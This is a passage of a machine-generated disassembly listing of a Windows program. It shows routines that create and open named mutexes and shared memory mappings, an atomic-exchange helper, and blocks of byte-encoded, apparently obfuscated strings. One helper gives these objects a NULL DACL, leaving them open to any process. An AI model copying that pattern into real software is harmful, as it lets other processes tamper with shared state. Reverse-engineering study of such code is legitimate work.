					; DATA XREF: sub_40BD58+FDo
		dd 0Bh
dword_40C08C	dd 263A3916h, 3B341D30h, 303931h, 0FFFFFFFFh, 0Ch
					; DATA XREF: sub_40BD58+10Co
dword_40C0A0	dd 30393007h, 18302634h, 2D302120h, 0 ;	DATA XREF: sub_40BD58+11Bo
		dd 0FFFFFFFFh, 0Ch
dword_40C0B8	dd 19213006h, 10212634h, 273A2727h, 0 ;	DATA XREF: sub_40BD58+12Ao
		dd 0FFFFFFFFh, 0Ah
dword_40C0D0	dd 34363A19h, 39391439h, 363Ah,	0FFFFFFFFh, 9 ;	DATA XREF: sub_40BD58+139o
dword_40C0E4	dd 34363A19h, 30271339h, 30h, 0FFFFFFFFh, 0Ch ;	DATA XREF: sub_40BD58+148o
dword_40C0F8	dd 21273C03h, 4393420h,	2C273020h, 0 ; DATA XREF: sub_40BD58+157o
		dd 0FFFFFFFFh, 5
dword_40C110	dd 30303906h, 25h, 0FFFFFFFFh, 16h ; DATA XREF:	sub_40BD58+166o
dword_40C120	dd 213C3402h, 18273A13h, 3C213920h, 1A303925h, 36303F37h
					; DATA XREF: sub_40BD58+175o
		dd 2621h

; =============== S U B	R O U T	I N E =======================================


sub_40C138	proc near		; CODE XREF: sub_40C1B0+13p
		pushf
		pop	eax
		mov	ecx, eax
		xor	eax, 200000h
		push	eax
		popf
		pushf
		pop	eax
		cmp	eax, ecx
		mov	eax, 0
		jz	short locret_40C169
		mov	eax, 1
		push	ebx
		cpuid
		pop	ebx
		test	edx, 100h
		mov	eax, 0
		jz	short locret_40C169
		mov	eax, 1

locret_40C169:				; CODE XREF: sub_40C138+14j
					; sub_40C138+2Aj
		retn
sub_40C138	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40C16C	proc near		; CODE XREF: sub_40C1B0+2Ep
					; DATA XREF: sub_40C1B0+29o

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		add	esp, 0FFFFFFF8h
		push	esi
		push	edi
		push	ebx
		push	ebp
		mov	ebp, [esp+18h+arg_4]
		mov	eax, ebp
		mov	edx, [eax+4]
		mov	eax, [eax]

loc_40C17E:				; CODE XREF: sub_40C16C+36j
		mov	[esp+18h+var_8], eax
		mov	[esp+18h+var_4], edx
		mov	esi, [esp+18h+arg_0]
		lea	edi, [esp+18h+var_8]
		mov	ecx, [esp+18h+arg_8]
		cld
		rep movsb
		mov	ebx, [esp+18h+var_8]
		mov	ecx, [esp+18h+var_4]
		lock cmpxchg8b qword ptr [ebp+0]
		jnz	short loc_40C17E
		pop	ebp
		pop	ebx
		pop	edi
		pop	esi
		add	esp, 8
		retn	0Ch
sub_40C16C	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_40C1B0	proc near		; CODE XREF: sub_40CD78+139p
					; sub_40D1F8+1BCp ...
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	esi, ecx
		mov	ebp, edx
		mov	edi, eax
		test	esi, esi
		jle	short loc_40C1CC
		cmp	esi, 8
		jg	short loc_40C1CC
		call	sub_40C138
		test	al, al
		jnz	short loc_40C1D0

loc_40C1CC:				; CODE XREF: sub_40C1B0+Cj
					; sub_40C1B0+11j
		xor	ebx, ebx
		jmp	short loc_40C1D2
; ---------------------------------------------------------------------------

loc_40C1D0:				; CODE XREF: sub_40C1B0+1Aj
		mov	bl, 1

loc_40C1D2:				; CODE XREF: sub_40C1B0+1Ej
		test	bl, bl
		jz	short loc_40C1E0
		push	esi
		push	ebp
		push	edi
		mov	eax, offset sub_40C16C
		call	eax ; sub_40C16C

loc_40C1E0:				; CODE XREF: sub_40C1B0+24j
		mov	eax, ebx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40C1B0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40C1E8	proc near		; CODE XREF: sub_40C210+3Cp
					; sub_40C3F4+44p
		push	ebx
		mov	ebx, edx
		mov	dword ptr [eax], 0Ch
		mov	[eax+4], ebx
		xor	edx, edx
		mov	[eax+8], edx
		push	1		; dwRevision
		push	ebx		; pSecurityDescriptor
		call	InitializeSecurityDescriptor
		push	0		; bDaclDefaulted
		push	0		; pDacl
		push	0FFFFFFFFh	; bDaclPresent
		push	ebx		; pSecurityDescriptor
		call	SetSecurityDescriptorDacl
		pop	ebx
		retn
sub_40C1E8	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_40C210(LPCSTR lpName)
sub_40C210	proc near		; CODE XREF: sub_40D00C+57p
					; sub_40E480+5Ep ...

var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= byte ptr -20h
MutexAttributes	= _SECURITY_ATTRIBUTES ptr -0Ch
lpName		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFCCh
		push	ebx
		push	esi
		xor	eax, eax
		mov	[ebp+var_30], eax
		mov	[ebp+var_34], eax
		mov	[ebp+var_24], eax
		mov	[ebp+var_28], eax
		mov	[ebp+var_2C], eax
		mov	esi, [ebp+lpName]
		xor	eax, eax
		push	ebp
		push	offset loc_40C2E8
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_40C2C1
		lea	edx, [ebp+var_20]
		lea	eax, [ebp+MutexAttributes]
		call	sub_40C1E8
		lea	edx, [ebp+var_28]
		mov	eax, offset loc_40C304
		call	sub_4064CC
		lea	eax, [ebp+var_28]
		push	eax
		lea	eax, [ebp+var_2C]
		mov	edx, esi
		call	sub_403B8C
		mov	edx, [ebp+var_2C]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_28]
		lea	ecx, [ebp+var_24]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+var_24]
		push	eax		; lpName
		push	0		; int
		lea	eax, [ebp+MutexAttributes]
		push	eax		; lpMutexAttributes
		call	sub_40520C
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_40C2CD
		lea	eax, [ebp+var_34]
		mov	edx, esi
		call	sub_403B8C
		mov	eax, [ebp+var_34]
		lea	ecx, [ebp+var_30]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+var_30]
		push	eax		; lpName
		push	0		; int
		lea	eax, [ebp+MutexAttributes]
		push	eax		; lpMutexAttributes
		call	sub_40520C
		mov	ebx, eax
		jmp	short loc_40C2CD
; ---------------------------------------------------------------------------

loc_40C2C1:				; CODE XREF: sub_40C210+34j
		push	esi		; lpName
		push	0		; int
		push	0		; lpMutexAttributes
		call	sub_4051E4
		mov	ebx, eax

loc_40C2CD:				; CODE XREF: sub_40C210+85j
					; sub_40C210+AFj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40C2EF

loc_40C2DA:				; CODE XREF: sub_40C210+DDj
		lea	eax, [ebp+var_34]
		mov	edx, 5
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40C2E8:				; DATA XREF: sub_40C210+1Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40C2DA
; ---------------------------------------------------------------------------

loc_40C2EF:				; CODE XREF: sub_40C210+D7j
					; DATA XREF: sub_40C210+C5o
		mov	eax, ebx
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_40C210	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 7
; ---------------------------------------------------------------------------

loc_40C304:				; DATA XREF: sub_40C210+44o
		adc	bh, [ecx]
		cmp	dh, [edi]
		xor	al, 39h
		or	[eax], eax

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40C30C	proc near		; CODE XREF: sub_40E63C+5Ep

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
lpName		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		xor	eax, eax
		push	ebp
		push	offset loc_40C3D1
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_40C3A7
		lea	edx, [ebp+var_8]
		mov	eax, offset loc_40C3EC
		call	sub_4064CC
		lea	eax, [ebp+var_8]
		push	eax
		lea	eax, [ebp+var_C]
		mov	edx, esi
		call	sub_403B8C
		mov	edx, [ebp+var_C]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_8]
		lea	ecx, [ebp+lpName]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+lpName]
		push	eax		; lpName
		push	0		; bInheritHandle
		push	100000h		; dwDesiredAccess
		call	OpenMutexW
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_40C3B6
		lea	eax, [ebp+var_14]
		mov	edx, esi
		call	sub_403B8C
		mov	eax, [ebp+var_14]
		lea	ecx, [ebp+var_10]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+var_10]
		push	eax		; lpName
		push	0		; bInheritHandle
		push	100000h		; dwDesiredAccess
		call	OpenMutexW
		mov	ebx, eax
		jmp	short loc_40C3B6
; ---------------------------------------------------------------------------

loc_40C3A7:				; CODE XREF: sub_40C30C+27j
		push	esi		; lpName
		push	0		; bInheritHandle
		push	100000h		; dwDesiredAccess
		call	OpenMutexA
		mov	ebx, eax

loc_40C3B6:				; CODE XREF: sub_40C30C+6Ej
					; sub_40C30C+99j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40C3D8

loc_40C3C3:				; CODE XREF: sub_40C30C+CAj
		lea	eax, [ebp+var_14]
		mov	edx, 5
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40C3D1:				; DATA XREF: sub_40C30C+12o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40C3C3
; ---------------------------------------------------------------------------

loc_40C3D8:				; CODE XREF: sub_40C30C+C4j
					; DATA XREF: sub_40C30C+B2o
		mov	eax, ebx
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_40C30C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 7
; ---------------------------------------------------------------------------

loc_40C3EC:				; DATA XREF: sub_40C30C+2Co
		adc	bh, [ecx]
		cmp	dh, [edi]
		xor	al, 39h
		or	[eax], eax

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_40C3F4(int,	DWORD dwMaximumSizeLow)
sub_40C3F4	proc near		; CODE XREF: sub_40DEDC+13Cp
					; sub_40E480+BBp ...

var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
lpName		= dword	ptr -24h
var_20		= byte ptr -20h
FileMappingAttributes= _SECURITY_ATTRIBUTES ptr	-0Ch
arg_0		= dword	ptr  8
dwMaximumSizeLow= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFCCh
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		mov	[ebp+var_30], eax
		mov	[ebp+var_34], eax
		mov	[ebp+lpName], eax
		mov	[ebp+var_28], eax
		mov	[ebp+var_2C], eax
		mov	edi, [ebp+dwMaximumSizeLow]
		mov	esi, [ebp+arg_0]
		xor	eax, eax
		push	ebp
		push	offset loc_40C4E3
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	GetVersion_0
		test	eax, 80000000h
		jnz	loc_40C4B7
		lea	edx, [ebp+var_20]
		lea	eax, [ebp+FileMappingAttributes]
		call	sub_40C1E8
		lea	edx, [ebp+var_28]
		mov	eax, offset loc_40C500
		call	sub_4064CC
		lea	eax, [ebp+var_28]
		push	eax
		lea	eax, [ebp+var_2C]
		mov	edx, esi
		call	sub_403B8C
		mov	edx, [ebp+var_2C]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_28]
		lea	ecx, [ebp+lpName]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+lpName]
		push	eax		; lpName
		push	edi		; dwMaximumSizeLow
		push	0		; dwMaximumSizeHigh
		push	4		; flProtect
		lea	eax, [ebp+FileMappingAttributes]
		push	eax		; lpFileMappingAttributes
		push	0FFFFFFFFh	; hFile
		call	CreateFileMappingW
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_40C4C8
		lea	eax, [ebp+var_34]
		mov	edx, esi
		call	sub_403B8C
		mov	eax, [ebp+var_34]
		lea	ecx, [ebp+var_30]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+var_30]
		push	eax		; lpName
		push	edi		; dwMaximumSizeLow
		push	0		; dwMaximumSizeHigh
		push	4		; flProtect
		lea	eax, [ebp+FileMappingAttributes]
		push	eax		; lpFileMappingAttributes
		push	0FFFFFFFFh	; hFile
		call	CreateFileMappingW
		mov	ebx, eax
		jmp	short loc_40C4C8
; ---------------------------------------------------------------------------

loc_40C4B7:				; CODE XREF: sub_40C3F4+38j
		push	esi		; lpName
		push	edi		; dwMaximumSizeLow
		push	0		; dwMaximumSizeHigh
		push	4		; flProtect
		push	0		; lpFileMappingAttributes
		push	0FFFFFFFFh	; hFile
		call	CreateFileMappingA_0
		mov	ebx, eax

loc_40C4C8:				; CODE XREF: sub_40C3F4+92j
					; sub_40C3F4+C1j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40C4EA

loc_40C4D5:				; CODE XREF: sub_40C3F4+F4j
		lea	eax, [ebp+var_34]
		mov	edx, 5
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40C4E3:				; DATA XREF: sub_40C3F4+23o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40C4D5
; ---------------------------------------------------------------------------

loc_40C4EA:				; CODE XREF: sub_40C3F4+EEj
					; DATA XREF: sub_40C3F4+DCo
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	8
sub_40C3F4	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 7
; ---------------------------------------------------------------------------

loc_40C500:				; DATA XREF: sub_40C3F4+4Co
		adc	bh, [ecx]
		cmp	dh, [edi]
		xor	al, 39h
		or	[eax], eax

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40C508	proc near		; CODE XREF: sub_40C734+68p
					; sub_40C870+63p ...

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
lpName		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		xor	eax, eax
		push	ebp
		push	offset loc_40C5D4
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	[ebp+arg_4], 0
		jz	short loc_40C533
		mov	ebx, 0F001Fh
		jmp	short loc_40C538
; ---------------------------------------------------------------------------

loc_40C533:				; CODE XREF: sub_40C508+22j
		mov	ebx, 4

loc_40C538:				; CODE XREF: sub_40C508+29j
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_40C5AE
		lea	edx, [ebp+var_8]
		mov	eax, offset loc_40C5F0
		call	sub_4064CC
		lea	eax, [ebp+var_8]
		push	eax
		lea	eax, [ebp+var_C]
		mov	edx, edi
		call	sub_403B8C
		mov	edx, [ebp+var_C]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_8]
		lea	ecx, [ebp+lpName]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+lpName]
		push	eax		; lpName
		push	0		; bInheritHandle
		push	ebx		; dwDesiredAccess
		call	OpenFileMappingW
		mov	esi, eax
		test	esi, esi
		jnz	short loc_40C5B9
		lea	eax, [ebp+var_14]
		mov	edx, edi
		call	sub_403B8C
		mov	eax, [ebp+var_14]
		lea	ecx, [ebp+var_10]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+var_10]
		push	eax		; lpName
		push	0		; bInheritHandle
		push	ebx		; dwDesiredAccess
		call	OpenFileMappingW
		mov	esi, eax
		jmp	short loc_40C5B9
; ---------------------------------------------------------------------------

loc_40C5AE:				; CODE XREF: sub_40C508+3Aj
		push	edi		; lpName
		push	0		; bInheritHandle
		push	ebx		; dwDesiredAccess
		call	OpenFileMappingA_0
		mov	esi, eax

loc_40C5B9:				; CODE XREF: sub_40C508+7Dj
					; sub_40C508+A4j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40C5DB

loc_40C5C6:				; CODE XREF: sub_40C508+D1j
		lea	eax, [ebp+var_14]
		mov	edx, 5
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40C5D4:				; DATA XREF: sub_40C508+13o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40C5C6
; ---------------------------------------------------------------------------

loc_40C5DB:				; CODE XREF: sub_40C508+CBj
					; DATA XREF: sub_40C508+B9o
		mov	eax, esi
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	8
sub_40C508	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 7
; ---------------------------------------------------------------------------

loc_40C5F0:				; DATA XREF: sub_40C508+3Fo
		adc	bh, [ecx]
		cmp	dh, [edi]
		xor	al, 39h
		or	[eax], eax

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40C5F8	proc near		; CODE XREF: sub_40C734+48p
					; sub_40C870+43p ...

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	0
		push	0
		push	0
		push	0
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		mov	esi, edx
		mov	[ebp+var_4], eax
		mov	edi, [ebp+arg_0]
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_40C6E0
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		test	bl, bl
		jz	short loc_40C63C
		mov	edx, edi
		mov	eax, offset dword_40C6F8
		call	sub_4064CC
		jmp	short loc_40C675
; ---------------------------------------------------------------------------

loc_40C63C:				; CODE XREF: sub_40C5F8+34j
		lea	edx, [ebp+var_8]
		mov	eax, offset dword_40C708
		call	sub_4064CC
		push	[ebp+var_8]
		push	offset dword_40C718
		lea	eax, [ebp+var_C]
		push	eax
		call	GetCurrentProcessId
		mov	cl, 30h
		mov	edx, 8
		call	sub_4061D8
		push	[ebp+var_C]
		mov	eax, edi
		mov	edx, 3
		call	sub_403CE4

loc_40C675:				; CODE XREF: sub_40C5F8+42j
		lea	edx, [ebp+var_10]
		mov	eax, [ebp+var_4]
		call	sub_4064CC
		push	[ebp+var_10]
		push	offset dword_40C724
		push	dword ptr [edi]
		push	offset dword_40C724
		lea	edx, [ebp+var_14]
		mov	eax, offset loc_40C730
		call	sub_4064CC
		push	[ebp+var_14]
		push	offset dword_40C718
		lea	eax, [ebp+var_18]
		push	eax
		mov	cl, 30h
		mov	edx, 8
		mov	eax, esi
		call	sub_4061D8
		push	[ebp+var_18]
		mov	eax, edi
		mov	edx, 7
		call	sub_403CE4
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40C6E7

loc_40C6D2:				; CODE XREF: sub_40C5F8+EDj
		lea	eax, [ebp+var_18]
		mov	edx, 6
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40C6E0:				; DATA XREF: sub_40C5F8+27o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40C6D2
; ---------------------------------------------------------------------------

loc_40C6E7:				; CODE XREF: sub_40C5F8+E7j
					; DATA XREF: sub_40C5F8+D5o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_40C5F8	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 6
dword_40C6F8	dd 27343D06h, 3130h, 0FFFFFFFFh, 7 ; DATA XREF:	sub_40C5F8+38o
dword_40C708	dd 363A2705h, 262630h, 0FFFFFFFFh, 1 ; DATA XREF: sub_40C5F8+47o
dword_40C718	dd 20h,	0FFFFFFFFh, 2	; DATA XREF: sub_40C5F8+54o
					; sub_40C5F8+A7o
dword_40C724	dd 202Ch, 0FFFFFFFFh, 3	; DATA XREF: sub_40C5F8+8Bo
					; sub_40C5F8+92o
; ---------------------------------------------------------------------------

loc_40C730:				; DATA XREF: sub_40C5F8+9Ao
		adc	al, 5
		sbb	al, 0

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40C734	proc near		; CODE XREF: sub_40C828+1Ep
					; sub_40C828+2Bp ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	[ebp+var_1], al
		xor	eax, eax
		push	ebp
		push	offset loc_40C7ED
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	ebx, ebx
		lea	edx, [ebp+var_C]
		mov	eax, offset dword_40C804
		call	sub_4064CC
		push	[ebp+var_C]
		push	offset dword_40C818
		lea	eax, [ebp+var_10]
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	edx, [eax-4]
		mov	cl, [ebp+var_1]
		mov	eax, offset dword_40C824
		call	sub_40C5F8
		push	[ebp+var_10]
		lea	eax, [ebp+var_8]
		mov	edx, 3
		call	sub_403CE4
		push	0FFFFFFFFh
		mov	eax, [ebp+var_8]
		call	sub_403E24
		push	eax
		call	sub_40C508
		mov	esi, eax
		test	esi, esi
		jz	short loc_40C7D2
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		push	esi		; hFileMappingObject
		call	MapViewOfFile
		test	eax, eax
		jz	short loc_40C7CC
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	ecx, [eax]
		mov	[edx-4], ecx
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile
		mov	bl, 1

loc_40C7CC:				; CODE XREF: sub_40C734+83j
		push	esi		; hObject
		call	CloseHandle

loc_40C7D2:				; CODE XREF: sub_40C734+71j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40C7F4

loc_40C7DF:				; CODE XREF: sub_40C734+BEj
		lea	eax, [ebp+var_10]
		mov	edx, 3
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40C7ED:				; DATA XREF: sub_40C734+11o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40C7DF
; ---------------------------------------------------------------------------

loc_40C7F4:				; CODE XREF: sub_40C734+B8j
					; DATA XREF: sub_40C734+A6o
		mov	eax, ebx
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40C734	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 0Bh
dword_40C804	dd 3038341Bh, 33201731h, 273033h, 0FFFFFFFFh, 2	; DATA XREF: sub_40C734+21o
dword_40C818	dd 202Ch, 0FFFFFFFFh, 3	; DATA XREF: sub_40C734+2Eo
dword_40C824	dd 2D3C38h		; DATA XREF: sub_40C734+43o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40C828	proc near		; CODE XREF: sub_40C984+Cp

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40C865
		mov	eax, [ebp+arg_0]
		cmp	dword ptr [eax-4], 80000000h
		jnb	short loc_40C850
		push	ebp
		xor	eax, eax
		call	sub_40C734
		pop	ecx
		test	al, al
		jnz	short loc_40C861

loc_40C850:				; CODE XREF: sub_40C828+19j
		push	ebp
		mov	al, 1
		call	sub_40C734
		pop	ecx
		test	al, al
		jnz	short loc_40C861
		xor	eax, eax
		jmp	short loc_40C86E
; ---------------------------------------------------------------------------

loc_40C861:				; CODE XREF: sub_40C828+26j
					; sub_40C828+33j
		mov	al, 1
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_40C865:				; CODE XREF: sub_40C828+Dj
		push	ebp
		xor	eax, eax
		call	sub_40C734
		pop	ecx

loc_40C86E:				; CODE XREF: sub_40C828+37j
		pop	ebp
		retn
sub_40C828	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40C870	proc near		; CODE XREF: sub_40C93C+1Ep
					; sub_40C93C+2Bp ...

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	0
		push	ebx
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_40C902
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	edx, [ebp+var_8]
		mov	eax, offset dword_40C918
		call	sub_4064CC
		push	[ebp+var_8]
		push	offset dword_40C92C
		lea	eax, [ebp+var_C]
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	edx, [eax-4]
		mov	ecx, ebx
		mov	eax, offset dword_40C938
		call	sub_40C5F8
		push	[ebp+var_C]
		lea	eax, [ebp+var_4]
		mov	edx, 3
		call	sub_403CE4
		push	0
		mov	eax, [ebp+var_4]
		call	sub_403E24
		push	eax
		call	sub_40C508
		test	eax, eax
		setnz	bl
		test	bl, bl
		jz	short loc_40C8E7
		push	eax		; hObject
		call	CloseHandle

loc_40C8E7:				; CODE XREF: sub_40C870+6Fj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40C909

loc_40C8F4:				; CODE XREF: sub_40C870+97j
		lea	eax, [ebp+var_C]
		mov	edx, 3
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40C902:				; DATA XREF: sub_40C870+Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40C8F4
; ---------------------------------------------------------------------------

loc_40C909:				; CODE XREF: sub_40C870+91j
					; DATA XREF: sub_40C870+7Fo
		mov	eax, ebx
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40C870	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 0Bh
dword_40C918	dd 3038341Bh, 33201731h, 273033h, 0FFFFFFFFh, 2	; DATA XREF: sub_40C870+1Do
dword_40C92C	dd 202Ch, 0FFFFFFFFh, 3	; DATA XREF: sub_40C870+2Ao
dword_40C938	dd 1D1438h		; DATA XREF: sub_40C870+3Eo

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40C93C	proc near		; CODE XREF: sub_40C984+1Ap

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40C979
		mov	eax, [ebp+arg_0]
		cmp	dword ptr [eax-4], 80000000h
		jnb	short loc_40C964
		push	ebp
		xor	eax, eax
		call	sub_40C870
		pop	ecx
		test	al, al
		jnz	short loc_40C975

loc_40C964:				; CODE XREF: sub_40C93C+19j
		push	ebp
		mov	al, 1
		call	sub_40C870
		pop	ecx
		test	al, al
		jnz	short loc_40C975
		xor	eax, eax
		jmp	short loc_40C982
; ---------------------------------------------------------------------------

loc_40C975:				; CODE XREF: sub_40C93C+26j
					; sub_40C93C+33j
		mov	al, 1
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_40C979:				; CODE XREF: sub_40C93C+Dj
		push	ebp
		xor	eax, eax
		call	sub_40C870
		pop	ecx

loc_40C982:				; CODE XREF: sub_40C93C+37j
		pop	ebp
		retn
sub_40C93C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40C984	proc near		; CODE XREF: sub_40CA04+12p
					; sub_40CA04+39p ...

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF4h
		push	ebx
		push	esi
		mov	eax, [ebp+arg_0]
		push	eax
		call	sub_40C828
		pop	ecx
		test	al, al
		jnz	short loc_40C9AC
		mov	eax, [ebp+arg_0]
		push	eax
		call	sub_40C93C
		pop	ecx
		test	al, al
		jnz	short loc_40C9AC
		xor	eax, eax
		jmp	short loc_40C9AE
; ---------------------------------------------------------------------------

loc_40C9AC:				; CODE XREF: sub_40C984+14j
					; sub_40C984+22j
		mov	al, 1

loc_40C9AE:				; CODE XREF: sub_40C984+26j
		mov	[ebp+var_1], al
		cmp	[ebp+var_1], 0
